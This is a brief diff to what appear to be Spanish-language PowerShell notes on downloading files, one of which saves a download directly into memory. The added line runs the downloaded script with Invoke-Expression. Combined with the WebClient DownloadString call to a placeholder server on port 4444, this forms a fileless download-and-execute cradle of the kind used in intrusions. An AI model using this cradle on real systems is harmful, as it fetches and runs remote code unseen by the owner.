@@ -37,6 +37,7 @@ $webclient.DownloadFile($url, $destino)
 GUARDANDO DIRECTAMENTE EN MEMORIA 
 $webclient = New-Object System.Net.WebClient
 $contenido = $webclient.DownloadString('http://direccion_del_servidor:4444/nombre_del_archivo')
+Invoke-Expression $contenido ---> para ejecutarlo si es un script
 
 
 
